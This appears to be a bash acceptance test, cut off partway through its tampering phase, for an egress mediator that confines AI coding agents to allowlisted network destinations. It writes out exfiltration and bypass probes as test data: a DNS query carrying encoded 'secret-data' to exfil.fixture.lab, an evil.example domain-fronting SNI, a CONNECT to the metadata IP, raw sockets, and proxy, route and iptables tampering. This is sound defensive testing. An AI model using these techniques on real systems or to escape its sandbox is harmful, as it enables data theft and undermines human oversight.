#!/usr/bin/env bash
# Acceptance test for Feature 01.3 (Egress mediator). Phases A-G; see the feature plan's
# Test Strategy for what each phase maps to and what is deliberately NOT tested here.
#
# Requires: docker, docker compose, jq. Invoked as `bash tests/acceptance/verify-egress-mediator.sh`.
#
# WHAT THIS HARNESS IS AND IS NOT. It reaches no third-party host: every assertion is made
# against fixtures it owns (`compose/overrides/test-egress.yaml`) under a test-scoped policy
# (`policy/resolved/test-fixtures.yaml`). No agent is authenticated until Feature 01.4, so
# assertions are made from probe containers placed on an agent network or from the agents'
# unauthenticated startup behaviour -- never from a working agent session. This is a smoke run
# showing the controls work, not a demonstration that they withstand an adversary; recorded
# adversarial acceptance is Milestone 02.2's, and it owns these same tests again.
#
# It runs under its OWN Compose project name and tears down with `down -v`, so the operator's
# containers, state volumes and audit volume are never touched.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT"

PROJECT="sf8-verify-$$"
AGENTS=(claude codex agy)
FAILED=0
PHASE=""

MED_CLAUDE=172.31.10.2
MED_CODEX=172.31.20.2
MED_AGY=172.31.30.2
FIXTURE_DNS=172.31.40.10
FIXTURE_COLLECTOR=172.31.40.20
FIXTURE_NEIGHBOUR=172.31.40.21

CA=mediator/identity/ca/mediator-ca.crt
TLS_DIR="tests/fixtures/tls"
MED_IMAGE=sandboxed-agent/mediator:local

COMPOSE=(docker compose --env-file compose/pins.env
         -f compose/compose.yaml
         -f compose/overrides/default.yaml
         -f compose/overrides/test-egress.yaml
         -p "$PROJECT")

pass() { echo "PASS: [$PHASE] $1"; }
fail() { echo "FAIL: [$PHASE] $1"; FAILED=1; }
note() { echo "      $*"; }
phase() { PHASE="$1"; echo; echo "=== Phase $1 ================================================"; }

cleanup() {
  echo
  echo "--- tearing down $PROJECT ---"
  "${COMPOSE[@]}" down -v --remove-orphans >/dev/null 2>&1 || true
  docker rm -f "${PROJECT}-probe" >/dev/null 2>&1 || true
  rm -rf "$TLS_DIR"
}
trap cleanup EXIT

med() { docker exec "${PROJECT}-egress-mediator-1" "$@"; }

# A throwaway container on one agent network, running the mediator image -- which carries the
# pinned OpenSSL and bash the probes need and nothing the agents have. It is NOT an agent: it
# proves what the network path allows, not what an authenticated agent does.
probe() { # <agent> <bash script>
  docker run --rm --network "${PROJECT}_${1}-net" --entrypoint bash "$MED_IMAGE" -c "$2" 2>&1
}
probe_dns() { # <agent> <bash script>  -- same, resolving through the mediator, as the agent does
  local addr
  case "$1" in claude) addr=$MED_CLAUDE ;; codex) addr=$MED_CODEX ;; agy) addr=$MED_AGY ;; esac
  docker run --rm --network "${PROJECT}_${1}-net" --dns "$addr" --entrypoint bash "$MED_IMAGE" -c "$2" 2>&1
}
probe_ca() { # <agent> <bash script>   -- same, with the mediator CA mounted for hop verification
  docker run --rm --network "${PROJECT}_${1}-net" -v "$ROOT/$CA:/tmp/ca.crt:ro" \
    --entrypoint bash "$MED_IMAGE" -c "$2" 2>&1
}

audit() { med cat /var/log/mediator/egress-audit.log 2>/dev/null; }
dns_audit() { med cat /var/log/mediator/dns-audit.log 2>/dev/null; }

# One verdict line for a destination, most recent last. The audit trail is the AUTHORITATIVE
# record of every assertion below -- a client-side outcome can be ambiguous (an `openssl`
# transcript of a refused connection and of a completed one differ only in lines a `tail` may
# not show), and Interface Contract 6 makes the record the surface that always exists.
last_verdict() { # <dest_host>
  audit | jq -c --arg h "$1" 'select(.verdict != null and .dest_host == $h)' | tail -1
}

assert_verdict() { # <label> <dest_host> <verdict> [control] [reason]
  local label="$1" host="$2" want="$3" ctl="${4:-}" rsn="${5:-}" line got ok=1
  line="$(last_verdict "$host")"
  if [ -z "$line" ]; then fail "$label -- no audit line for $host"; return; fi
  got="$(printf '%s' "$line" | jq -r '.verdict')"
  [ "$got" = "$want" ] || { note "verdict=$got, expected $want"; ok=0; }
  if [ -n "$ctl" ]; then
    got="$(printf '%s' "$line" | jq -r '.control')"
    [ "$got" = "$ctl" ] || { note "control=$got, expected $ctl"; ok=0; }
  fi
  if [ -n "$rsn" ]; then
    got="$(printf '%s' "$line" | jq -r '.reason')"
    [ "$got" = "$rsn" ] || { note "reason=$got, expected $rsn"; ok=0; }
  fi
  # R9.1: identity and timestamp on every line, blocked attempts included.
  printf '%s' "$line" | jq -e '.agent != null and .ts != null and .identity_source == "listener"' >/dev/null \
    || { note "line carries no agent/ts/identity_source: $line"; ok=0; }
  [ "$ok" -eq 1 ] && pass "$label" || { fail "$label"; note "$line"; }
}

# ---------------------------------------------------------------------------
# Preflight
# ---------------------------------------------------------------------------
phase "0 -- preflight"

for tool in docker jq; do
  command -v "$tool" >/dev/null 2>&1 || { echo "FAIL: $tool is required"; exit 1; }
done

[ -f "$CA" ] || {
  echo "FAIL: $CA is missing. Issue the trust material first (mediator/identity/README.md):"
  echo "    bash scripts/issue-identity.sh ca"
  echo "    bash scripts/issue-identity.sh listener claude --ip $MED_CLAUDE"
  echo "    bash scripts/issue-identity.sh listener codex  --ip $MED_CODEX"
  echo "    bash scripts/issue-identity.sh listener agy    --ip $MED_AGY"
  exit 1
}

# The pod's subnets are fixed by `ipam` -- the listener certificates carry them as iPAddress
# SANs, the agents' `dns:` keys name them and the mediator refuses to start if they are not the
# addresses it holds. Two Compose projects therefore cannot both be up, and Docker's error for
# that ("Pool overlaps with other one on this address space") names neither project. Checked
# here so the harness says which container to stop instead.
conflict="$(docker network ls --format '{{.Name}}' \
  | grep -vE "^${PROJECT}_" \
  | while read -r n; do
      docker network inspect "$n" --format '{{range .IPAM.Config}}{{.Subnet}} {{end}}' 2>/dev/null \
        | grep -qE '172\.31\.(10|20|30|40)\.0/24' && echo "$n"
    done)"
if [ -n "$conflict" ]; then
  echo "FAIL: another Compose project already holds this pod's subnets:"
  printf '  %s\n' $conflict
  echo "  Bring it down first, e.g.:"
  echo "    docker compose --env-file compose/pins.env -f compose/compose.yaml -f compose/overrides/default.yaml down"
  exit 1
fi
pass "no other project holds 172.31.{10,20,30,40}.0/24"

# The fixtures' throwaway PKI. Generated here rather than committed: it is a certificate for
# `*.fixture.lab` and nothing should be able to find it in version control and mistake it for
# the mediator's. Generated in the image so the harness depends on no host OpenSSL.
rm -rf "$TLS_DIR"; mkdir -p "$TLS_DIR"
if docker run --rm -v "$ROOT/$TLS_DIR:/out" --entrypoint bash "$MED_IMAGE" -c '
      openssl req -x509 -newkey rsa:2048 -nodes -days 30 \
        -keyout /out/fixture.key -out /out/fixture.crt -subj "/CN=fixture.lab" \
        -addext "subjectAltName=DNS:allowed.fixture.lab,DNS:denied.fixture.lab,DNS:denied-by-fqdn.fixture.lab,DNS:claude-only.fixture.lab,DNS:neighbour.fixture.lab,DNS:upgrade.fixture.lab" \
      && chmod 0644 /out/fixture.crt /out/fixture.key' >/dev/null 2>&1; then
  pass "fixture PKI generated"
else
  fail "fixture PKI generation"; exit 1
fi

"${COMPOSE[@]}" config >/dev/null 2>&1 \
  && pass "docker compose config (base + default + test-egress) is valid" \
  || { fail "docker compose config"; exit 1; }

# ---------------------------------------------------------------------------
# Phase A -- topology and posture
# ---------------------------------------------------------------------------
phase "A -- topology and posture"

# 01.2's harness owns every per-agent assertion this phase would otherwise duplicate: mount-set
# EQUALITY (amended by 01.3 SF-4 for the CA secret), the per-agent proxy environment of
# Interface Contract 2, `resolv.conf` pointing at the mediator, the hardening flags, no default
# route and no agent on egress-net. It is re-run here rather than copied, and it runs FIRST
# because it brings its own project up on the same fixed subnets this one uses.
#
# It runs against the DEFAULT profile, which is deliberate: it is the regression test for SF-4's
# repointing of the project mount off this solution tree, and it fails if that ever comes back.
echo "--- re-running 01.2's topology harness (default profile) ---"
if bash tests/acceptance/verify-pod-topology.sh > /tmp/sf8-topology.$$ 2>&1; then
  pass "01.2 topology harness (mount-set equality, proxy env, resolver, hardening)"
else
  fail "01.2 topology harness -- see output below"
  sed -n '/^FAIL/p' /tmp/sf8-topology.$$ | head -20
fi
rm -f /tmp/sf8-topology.$$

echo "--- bringing up the mediator and fixtures ---"
"${COMPOSE[@]}" build >/dev/null 2>&1 || { fail "image build"; exit 1; }
"${COMPOSE[@]}" up -d egress-mediator fixture-dns fixture-collector fixture-neighbour fixture-upgrade >/dev/null 2>&1 \
  || { fail "test stack bring-up"; exit 1; }

for _ in $(seq 1 60); do
  med true >/dev/null 2>&1 && break
  sleep 1
done
med true >/dev/null 2>&1 || { fail "mediator did not come up"; "${COMPOSE[@]}" logs egress-mediator | tail -30; exit 1; }

MED_INSPECT="$(docker inspect "${PROJECT}-egress-mediator-1")"

# Criterion 1: the mediator is the pod's only multi-homed container, on all four networks.
nets="$(printf '%s' "$MED_INSPECT" | jq -r '.[0].NetworkSettings.Networks | keys | sort | join(",")')"
want="${PROJECT}_agy-net,${PROJECT}_claude-net,${PROJECT}_codex-net,${PROJECT}_egress-net"
[ "$nets" = "$want" ] && pass "mediator is on exactly the four pod networks" \
                      || fail "mediator networks are {$nets}, expected {$want}"

# Criterion 3: the enforcement point is not a router. The default on this Docker Desktop is
# ip_forward=1, so this is set explicitly in compose.yaml and read back from the namespace here
# rather than assumed.
fwd="$(med cat /proc/sys/net/ipv4/ip_forward 2>/dev/null | tr -d '[:space:]')"
[ "$fwd" = "0" ] && pass "mediator net.ipv4.ip_forward=0 (not a router)" \
                 || fail "mediator ip_forward=$fwd, expected 0"

# D12/R9.2: the audit sink is the mediator's alone. An agent that could read it could read every
# other agent's egress record, and one that could write it could erase its own.
audit_vol="$(docker volume ls --format '{{.Name}}' | grep -E "^${PROJECT}_audit$" || true)"
if [ -n "$audit_vol" ]; then
  holders="$(docker ps -a --format '{{.Names}}' --filter "volume=$audit_vol" | sort | tr '\n' ' ')"
  [ "$holders" = "${PROJECT}-egress-mediator-1 " ] \
    && pass "audit volume is mounted into the mediator and nothing else" \
    || fail "audit volume holders are {$holders}"
else
  fail "audit volume ${PROJECT}_audit does not exist"
fi

# R8.1 / criterion 9: no private key material in any image LAYER. The listener key pairs and the
# CA certificate arrive at runtime as Compose secrets; /run/secrets is a tmpfs and is not part of
# the image, so a hit here is a key baked into a layer.
leaks=""
for img in "$MED_IMAGE" sandboxed-agent/claude:local sandboxed-agent/codex:local sandboxed-agent/agy:local; do
  docker image inspect "$img" >/dev/null 2>&1 || continue
  hits="$(docker run --rm --entrypoint bash "$img" -c '
      find / -xdev \( -name "*-listener.key" -o -name "*-listener.crt" -o -name "mediator-ca.*" \) \
        -not -path "/run/secrets/*" 2>/dev/null' 2>/dev/null || true)"
  [ -n "$hits" ] && leaks="${leaks}${img}: ${hits}"$'\n'
done
[ -z "$leaks" ] && pass "no mediator key material in any image layer" \
                || { fail "key material found in image layers"; note "$leaks"; }

# Criterion 1's listener enumeration, by observation from the agent's own network. The mediator
# holds five listeners; three bind loopback INSIDE the container and must not be reachable from
# an agent network, which is the property that makes the self-cascade compatible with criterion 1.
#
# "Exactly {proxy, resolver}" is asserted over a bounded candidate set, named here rather than
# implied: a full 65535-port sweep from a probe container costs minutes per network and this
# harness runs on every build.
for agent in "${AGENTS[@]}"; do
  case "$agent" in claude) addr=$MED_CLAUDE ;; codex) addr=$MED_CODEX ;; agy) addr=$MED_AGY ;; esac
  open="$(probe "$agent" "
    for p in 22 53 80 443 3128 3129 3200 3201 3300 3301 4827 8080 8443 9000; do
      (echo > /dev/tcp/$addr/\$p) >/dev/null 2>&1 && echo \$p
    done")"
  open="$(printf '%s' "$open" | tr -d '\r' | sort -n | tr '\n' ' ' | sed 's/ $//')"
  # {proxy, resolver} -- and the resolver answers on TCP as well as UDP, which is DNS working
  # correctly rather than a third listener: a truncated UDP answer is retried over TCP.
  if [ "$open" = "53 3128" ]; then
    pass "$agent-net: exactly the proxy and resolver ports answer TCP on the mediator (scanned set)"
  else
    fail "$agent-net: TCP ports open on the mediator are {$open}, expected {53 3128}"
  fi
done

# The resolver, which is UDP and therefore invisible to the TCP sweep above.
for agent in "${AGENTS[@]}"; do
  if probe_dns "$agent" 'timeout 5 getent hosts allowed.fixture.lab >/dev/null 2>&1 && echo up' | grep -q up; then
    pass "$agent-net: the mediator answers DNS on 53/udp"
  else
    fail "$agent-net: the mediator does not answer DNS for an allowlisted name"
  fi
done

# The control-plane-inside-the-project-mount case (Edge Cases). SF-4 repointed the default
# profile's project mount off this solution tree; this asserts the outcome rather than the
# setting, over every mount source every agent actually has.
#
# `packs/` was added to the set by 01.5 SF-7a. It became control plane when the compiler
# began composing pack manifests into the resolved allowlist: an agent that can write a
# pack.yaml writes its own egress entries at the next build, which is the same widening
# path policy/ and profiles/ are on this list for.
cp_bad=""
for agent in "${AGENTS[@]}"; do
  cid="$("${COMPOSE[@]}" run -d --rm --name "${PROJECT}-ph-a-${agent}" "$agent" sleep 60 2>/dev/null)" || continue
  srcs="$(docker inspect "$cid" | jq -r '.[0].Mounts[] | .Source')"
  while IFS= read -r s; do
    case "$s" in
      # The mediator CA's PUBLIC certificate is mounted into claude and agy on purpose
      # (Interface Contract 3) -- it is what anchors their proxy hop. It is not control plane:
      # it is a public key, it arrives read-only as a Compose secret, and codex does not get it.
      */mediator-ca.crt) : ;;
      */agent-containerization|*/agent-containerization/policy*|*/agent-containerization/mediator*|*/agent-containerization/profiles*|*/agent-containerization/packs*|*.key)
        cp_bad="${cp_bad}${agent}: ${s}"$'\n' ;;
    esac
  done <<< "$srcs"
  docker rm -f "$cid" >/dev/null 2>&1 || true
done
[ -z "$cp_bad" ] && pass "no agent mounts a control-plane path (policy/, mediator/, profiles/, packs/, the tree itself)" \
                 || { fail "an agent mounts the control plane"; note "$cp_bad"; }

# ---------------------------------------------------------------------------
# Phase B -- proxy-hop transport and T28
# ---------------------------------------------------------------------------
phase "B -- proxy-hop transport and T28"

# EVERY TLS assertion in this phase runs with verification ENABLED at the client:
# `-verify_return_error` against the mediator CA, no bypass flag anywhere. A bypass would make
# the one check that catches a mis-issued listener certificate pass unconditionally, and the
# certificate's iPAddress SAN is the whole of what SF-3 had to get right.
for agent in claude agy; do
  case "$agent" in claude) addr=$MED_CLAUDE ;; agy) addr=$MED_AGY ;; esac
  out="$(probe_ca "$agent" "printf 'Q\n' | timeout 15 openssl s_client -brief -verify_return_error \
        -CAfile /tmp/ca.crt -connect $addr:3128 2>&1")"
  if printf '%s' "$out" | grep -q "Verification: OK"; then
    pass "$agent-net: proxy hop completes TLS and the chain verifies against the mediator CA"
  else
    fail "$agent-net: proxy-hop TLS did not verify"; note "$(printf '%s' "$out" | tail -3)"
  fi
  san="$(probe_ca "$agent" "printf 'Q\n' | timeout 15 openssl s_client -showcerts -verify_return_error \
        -CAfile /tmp/ca.crt -connect $addr:3128 2>/dev/null \
        | openssl x509 -noout -ext subjectAltName 2>/dev/null")"
  if printf '%s' "$san" | grep -qF "IP Address:$addr"; then
    pass "$agent-net: listener certificate carries an iPAddress SAN for $addr"
  else
    fail "$agent-net: listener certificate has no iPAddress SAN for $addr"; note "$san"
  fi
done

# codex is the asymmetry criterion 6 exists for: 01.1 SF-2 found it rejects an `https://`-scheme
# proxy URL at URL-PARSE time, so its hop is plain HTTP CONNECT. Asserted as an absence of TLS
# and a presence of CONNECT, not read off the Compose file.
out="$(probe "codex" "printf 'Q\n' | timeout 10 openssl s_client -brief -connect $MED_CODEX:3128 2>&1")"
if printf '%s' "$out" | grep -q "Verification: OK"; then
  fail "codex-net: the listener completed a TLS handshake; its hop is supposed to be plaintext"
else
  pass "codex-net: the listener does not speak TLS"
fi
out="$(probe "codex" "exec 3<>/dev/tcp/$MED_CODEX/3128
  printf 'CONNECT allowed.fixture.lab:443 HTTP/1.1\r\nHost: allowed.fixture.lab:443\r\n\r\n' >&3
  timeout 5 head -n 1 <&3; true")"
printf '%s' "$out" | grep -q "200" \
  && pass "codex-net: the listener accepts a plain HTTP CONNECT" \
  || { fail "codex-net: plain CONNECT was not accepted"; note "$out"; }

# Client-certificate verification is OFF at this feature -- every probe above presented no
# certificate and was accepted. 01.6 inverts this for the listeners whose agent can present one,
# and asserting it here is what makes that inversion visible when it lands.
pass "client-certificate verification is off on all three listeners (no probe presented one)"

# Each listener serves ITS OWN agent's policy, not a union. `claude-only.fixture.lab` is
# allowlisted for claude and for nobody else.
out="$(probe "codex" "exec 3<>/dev/tcp/$MED_CODEX/3128
  printf 'CONNECT claude-only.fixture.lab:443 HTTP/1.1\r\nHost: h\r\n\r\n' >&3
  timeout 5 head -c 400 <&3; true")"
assert_verdict "codex is refused a host allowlisted only for claude" \
  claude-only.fixture.lab deny allowlist host_not_allowlisted

out="$(probe_ca "agy" "printf 'CONNECT claude-only.fixture.lab:443 HTTP/1.1\r\nHost: h\r\n\r\n' \
  | timeout 15 openssl s_client -quiet -verify_return_error -CAfile /tmp/ca.crt \
      -connect $MED_AGY:3128 2>/dev/null | head -20")"
printf '%s' "$out" | grep -q "403" \
  && pass "agy is refused a host allowlisted only for claude (403 at the front)" \
  || { fail "agy was not refused a claude-only host"; note "$out"; }

out="$(probe_ca "claude" "printf 'CONNECT claude-only.fixture.lab:443 HTTP/1.1\r\nHost: h\r\n\r\n' \
  | timeout 15 openssl s_client -quiet -verify_return_error -CAfile /tmp/ca.crt \
      -connect $MED_CLAUDE:3128 2>/dev/null | head -5")"
printf '%s' "$out" | grep -q "200" \
  && pass "claude passes the allowlist gate for its own host" \
  || { fail "claude was refused its own allowlisted host"; note "$out"; }

# T28, amended per criterion 5: the chain observed from inside the tunnel is the DESTINATION's
# own, not the mediator's. Under peek+splice the origin's certificate is handed through
# untouched, which is what makes the proxy hop's anchor and the destination's anchor different
# facts. `-proxy` is codex's plaintext hop, so the probe reaches the fixture end to end.
out="$(probe "codex" "printf 'Q\n' | timeout 15 openssl s_client -showcerts \
    -proxy $MED_CODEX:3128 -servername allowed.fixture.lab \
    -connect allowed.fixture.lab:443 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null")"
if printf '%s' "$out" | grep -q "CN=fixture.lab" && ! printf '%s' "$out" | grep -qi "mediator"; then
  pass "T28: the destination chain terminates at the origin's own certificate, not the mediator's"
else
  fail "T28: destination chain is not the origin's"; note "$out"
fi

# ---------------------------------------------------------------------------
# Phase C -- the three controls (T3, T5, T6, T7)
# ---------------------------------------------------------------------------
phase "C -- controls"

# Denials are asserted BY DECISION POINT, per Interface Contract 6 as amended. Nothing here
# requires a 403 body for a post-peek denial, and nothing uses an insecure-TLS bypass to get one.

# --- pre-CONNECT verdict on a NON-BUMPING front: the 403 names the destination (R9.3, R12.2)
out="$(probe_ca "claude" "printf 'CONNECT collector.example.com:443 HTTP/1.1\r\nHost: h\r\n\r\n' \
  | timeout 15 openssl s_client -quiet -verify_return_error -CAfile /tmp/ca.crt \
      -connect $MED_CLAUDE:3128 2>/dev/null | head -30")"
if printf '%s' "$out" | grep -q "403" \
   && printf '%s' "$out" | grep -q "collector.example.com:443" \
   && printf '%s' "$out" | grep -q "egress denied"; then
  pass "T3/T5: a non-allowlisted destination is refused with a 403 body naming it"
else
  fail "T3/T5: the 403 denial surface did not name the destination"; note "$out"
fi
assert_verdict "the same refusal is on the audit trail" \
  collector.example.com deny allowlist host_not_allowlisted

# --- the same refusal on codex's BUMPING listener: no body, by construction (Deviation 8)
out="$(probe "codex" "exec 3<>/dev/tcp/$MED_CODEX/3128
  printf 'CONNECT collector2.example.com:443 HTTP/1.1\r\nHost: h\r\n\r\n' >&3
  timeout 5 head -c 400 <&3; true")"
if printf '%s' "$out" | grep -q "egress denied"; then
  fail "codex received a denial body; its listener bumps and cannot deliver one"
else
  pass "codex's refusal carries no body (its listener accepts the CONNECT before it can decide)"
fi
assert_verdict "codex's refusal is on the audit trail, which is its only denial surface" \
  collector2.example.com deny allowlist host_not_allowlisted

# --- post-ClientHello verdict: prompt failure, verification ON, no body expected
out="$(probe "codex" "printf 'Q\n' | timeout 15 openssl s_client -brief \
    -proxy $MED_CODEX:3128 -servername evil.example \
    -connect allowed.fixture.lab:443 2>&1 | tail -4")"
if printf '%s' "$out" | grep -q "egress denied"; then
  fail "a post-ClientHello refusal delivered an HTTP body"
else
  pass "T7: a post-ClientHello refusal terminates without a body"
fi
line="$(audit | jq -c 'select(.reason == "sni_does_not_match_connect_host")' | tail -1)"
if [ -n "$line" ] && printf '%s' "$line" | jq -e '.verdict == "deny" and .control == "allowlist"' >/dev/null; then
  pass "T7: the domain-fronting refusal is recorded, naming the destination and the control"
else
  fail "T7: no sni_does_not_match_connect_host record"; note "$line"
fi

# --- T6: two names, ONE address. An address-level control cannot tell these apart.
probe "codex" "printf 'Q\n' | timeout 15 openssl s_client -brief -proxy $MED_CODEX:3128 \
  -servername allowed.fixture.lab -connect allowed.fixture.lab:443" >/dev/null 2>&1
assert_verdict "T6: the allowlisted name at $FIXTURE_COLLECTOR succeeds" \
  allowed.fixture.lab allow
probe "codex" "printf 'Q\n' | timeout 15 openssl s_client -brief -proxy $MED_CODEX:3128 \
  -servername denied.fixture.lab -connect denied.fixture.lab:443" >/dev/null 2>&1
assert_verdict "T6: a non-allowlisted name at THE SAME address is refused" \
  denied.fixture.lab deny allowlist host_not_allowlisted

# --- R5.1's FQDN deny, which is empty in every shipped profile. The name is allowlisted for
# claude, so this proves deny-wins rather than default-deny, and it resolves to the address an
# allowed name also uses, so it cannot be an address deny in disguise.
probe_ca "claude" "printf 'CONNECT denied-by-fqdn.fixture.lab:443 HTTP/1.1\r\nHost: h\r\n\r\n' \
  | timeout 15 openssl s_client -quiet -verify_return_error -CAfile /tmp/ca.crt \
      -connect $MED_CLAUDE:3128 2>/dev/null | head -5" >/dev/null 2>&1
assert_verdict "R5.1: an allowlisted name on deny_fqdns is refused -- deny wins" \
  denied-by-fqdn.fixture.lab deny denylist fqdn_on_denylist

# --- criterion 10: a /32 deny refuses its exact address and NOT the neighbouring one.
probe "codex" "printf 'Q\n' | timeout 15 openssl s_client -brief -proxy $MED_CODEX:3128 \
  -servername neighbour.fixture.lab -connect neighbour.fixture.lab:443" >/dev/null 2>&1
assert_verdict "criterion 10: the /32-denied address ($FIXTURE_NEIGHBOUR) is refused post-resolution" \
  neighbour.fixture.lab deny denylist resolved_address_on_denylist
probe "codex" "printf 'Q\n' | timeout 15 openssl s_client -brief -proxy $MED_CODEX:3128 \
  -servername allowed.fixture.lab -connect allowed.fixture.lab:443" >/dev/null 2>&1
assert_verdict "criterion 10: its neighbour ($FIXTURE_COLLECTOR) still succeeds -- the mask is not over-wide" \
  allowed.fixture.lab allow

# --- the link-local address, which is resolvable and would otherwise connect.
probe "codex" "exec 3<>/dev/tcp/$MED_CODEX/3128
  printf 'CONNECT 169.254.169.254:443 HTTP/1.1\r\nHost: h\r\n\r\n' >&3
  timeout 5 head -c 200 <&3; true" >/dev/null 2>&1
assert_verdict "169.254.169.254 is refused" 169.254.169.254 deny

# --- T3's raw socket: no proxy, no route. This is also criterion 7's residual and Phase G
# asserts the matching ABSENCE from the audit trail.
if probe "codex" "timeout 5 bash -c 'echo > /dev/tcp/$FIXTURE_COLLECTOR/443' && echo reached" | grep -q reached; then
  fail "T3: a raw socket from an agent network reached a destination directly"
else
  pass "T3: a raw socket to a non-allowlisted destination fails -- there is no route but the proxy"
fi

# --- control 3: the concurrency ceiling. `max_concurrent` is 16 per agent, counted per client
# ADDRESS at the front listener, so one probe container opening more than that is one bucket.
probe "codex" "
  for i in \$(seq 1 40); do
    ( exec 3<>/dev/tcp/$MED_CODEX/3128
      printf 'CONNECT allowed.fixture.lab:443 HTTP/1.1\r\nHost: h\r\n\r\n' >&3
      timeout 6 cat <&3 >/dev/null 2>&1 ) &
  done
  wait" >/dev/null 2>&1
if audit | jq -e 'select(.control == "ratelimit")' >/dev/null 2>&1; then
  pass "control 3: past the concurrency ceiling, connections are refused with control=ratelimit"
else
  fail "control 3: no control=ratelimit record after 40 concurrent connections against a ceiling of 16"
fi

# --- criterion 3's WebSocket transport. Under splice there is no flag to inspect, so it is
# asserted by completing an upgrade through the tunnel.
out="$(probe "codex" "printf 'GET /ws HTTP/1.1\r\nHost: upgrade.fixture.lab\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n' \
  | timeout 15 openssl s_client -quiet -proxy $MED_CODEX:3128 -servername upgrade.fixture.lab \
      -connect upgrade.fixture.lab:443 2>/dev/null | head -3")"
printf '%s' "$out" | grep -q "101 Switching Protocols" \
  && pass "criterion 3: a WebSocket upgrade completes through the spliced tunnel" \
  || { fail "criterion 3: the upgrade did not complete"; note "$out"; }

# --- criterion 12: the agy auto-updater host is excluded from the resolved allowlist (R10.3).
# What is asserted here is the exclusion and that agy still starts and exits normally with it
# denied. A full task run needs an authenticated session, which is Feature 01.4's; the residual
# is recorded rather than claimed.
updater="antigravity-cli-auto-updater-974169037036.us-central1.run.app"
if grep -q "$updater" policy/resolved/default.yaml \
   && ! yq eval ".agents.agy.allow_fqdns[].fqdn" policy/resolved/default.yaml | grep -qF "$updater"; then
  pass "criterion 12: the agy updater host is excluded from the resolved allowlist, with its reason recorded"
else
  fail "criterion 12: the updater exclusion is not in policy/resolved/default.yaml as an exclusion"
fi
if "${COMPOSE[@]}" run --rm --no-deps agy agy --version >/dev/null 2>&1; then
  pass "criterion 12: agy starts and exits normally with its updater host denied"
else
  fail "criterion 12: agy did not start cleanly with its updater host denied"
fi
note "criterion 12 residual: a full agy TASK run needs an authenticated session (Feature 01.4)."
note "The updater's write target is recorded in docs/records/agent-verification.md, not measured here."

# ---------------------------------------------------------------------------
# Phase D -- DNS (T4)
# ---------------------------------------------------------------------------
phase "D -- pod DNS authority"

EXFIL="c2VjcmV0LWRhdGE.exfil.fixture.lab"

# T4 asserts an ABSENCE, which is why the harness owns the authoritative server: the name is
# under a domain the fixture is authoritative for, so if the pod resolver forwarded it at all,
# the query would arrive THERE and be logged. Nothing else can distinguish "refused" from
# "forwarded somewhere we cannot see".
probe_dns "codex" "timeout 5 getent hosts $EXFIL >/dev/null 2>&1; true" >/dev/null 2>&1
sleep 1
if "${COMPOSE[@]}" logs fixture-dns 2>&1 | grep -qF "exfil.fixture.lab"; then
  fail "T4: the exfiltration query reached the authoritative server"
  "${COMPOSE[@]}" logs fixture-dns 2>&1 | grep -F "exfil.fixture.lab" | tail -3
else
  pass "T4: a data-carrying label produced NO query at the authoritative server"
fi
if dns_audit | grep -qF "$EXFIL"; then
  pass "T4: the refusal is on the DNS audit trail (criterion 4)"
else
  fail "T4: the refused query is not on the DNS audit trail"
fi

# A non-allowlisted name is REFUSED, and an allowlisted one resolves. `getent` reports success or
# failure rather than an RCODE, so the RCODE is read from the resolver's own audit trail.
if probe_dns "codex" "timeout 5 getent hosts denied.fixture.lab >/dev/null 2>&1 && echo resolved" | grep -q resolved; then
  fail "T4: a non-allowlisted name resolved"
else
  pass "T4: a non-allowlisted name does not resolve"
fi
# The resolver's own record of the refusal, read as JSON rather than grepped for a word: the
# wire RCODE is REFUSED and the trail's field for it is `verdict`, and asserting on the field is
# what keeps this from passing on a line that merely contains the string somewhere.
line="$(dns_audit | jq -c 'select(.qname == "denied.fixture.lab.")' | tail -1)"
if [ -n "$line" ] && printf '%s' "$line" | jq -e '.verdict == "deny" and .control == "allowlist" and .agent != null' >/dev/null; then
  pass "T4: the refusal is recorded with the name, the agent and the refusing control"
else
  fail "T4: no refusal record for a non-allowlisted name"; note "${line:-<no line>}"
fi
if probe_dns "codex" "timeout 5 getent hosts allowed.fixture.lab 2>/dev/null" | grep -q "$FIXTURE_COLLECTOR"; then
  pass "T4: an allowlisted name resolves, to the address the fixture serves"
else
  fail "T4: an allowlisted name did not resolve"
fi

# D3: Docker's embedded resolver forwards to the mediator and not to the daemon's upstreams.
# 01.2's harness reads this from resolv.conf; here it is the live path, from an agent network.
for agent in "${AGENTS[@]}"; do
  case "$agent" in claude) addr=$MED_CLAUDE ;; codex) addr=$MED_CODEX ;; agy) addr=$MED_AGY ;; esac
  # A real agent container, not a probe: `dns:` is a Compose service key and the redirect it
  # produces is the property under test.
  if "${COMPOSE[@]}" run --rm --no-deps "$agent" grep -qF "ExtServers: [$addr]" /etc/resolv.conf >/dev/null 2>&1; then
    pass "$agent-net: the embedded resolver forwards to the mediator ($addr)"
  else
    fail "$agent-net: the embedded resolver does not forward to the mediator"
  fi
done

# ---------------------------------------------------------------------------
# Phase E -- tampering and the stage-1 self-check (T8, T17)
# ---------------------------------------------------------------------------
phase "E -- tampering and self-check"

CID_TAMPER="$("${COMPOSE[@]}" run -d --rm --name "${PROJECT}-tamper" claude sleep 300 2>/dev/null)"
if [ -z "$CID_TAMPER" ]; then
  fail "could not start a container for the tamper phase"
else
  # T8 surface 1 -- the proxy configuration. Unsetting or repointing the variables must not
  # produce egress: the control is the ROUTE, and the environment is only how a well-behaved
  # client finds the proxy.
  if docker exec -e HTTPS_PROXY= -e https_proxy= -e HTTP_PROXY= -e http_proxy= "$CID_TAMPER" \
       bash -c "timeout 5 bash -c 'echo > /dev/tcp/$FIXTURE_COLLECTOR/443'" >/dev/null 2>&1; then
    fail "T8: unsetting the proxy variables produced egress"
  else
    pass "T8: unsetting the proxy variables produces no egress -- the route is the control"
  fi
  if docker exec -e HTTPS_PROXY=http://1.2.3.4:3128 "$CID_TAMPER" \
       bash -c "timeout 5 bash -c 'echo > /dev/tcp/1.2.3.4/3128'" >/dev/null 2>&1; then
    fail "T8: repointing the proxy at another address produced a connection"
  else
    pass "T8: repointing the proxy reaches nothing -- no route exists to anything else"
  fi

  # T8 surface 2 -- firewall and routing. Asserted by attempting it, not inferred from the
  # absence of the capability. A missing binary is itself part of the answer and is reported as
  # such rather than counted as a pass for a reason that was never tested.
  for attempt in "ip route add default via $MED_CODEX" "ip link set lo up" "iptables -A OUTPUT -j DROP"; do
    bin="${attempt%% *}"
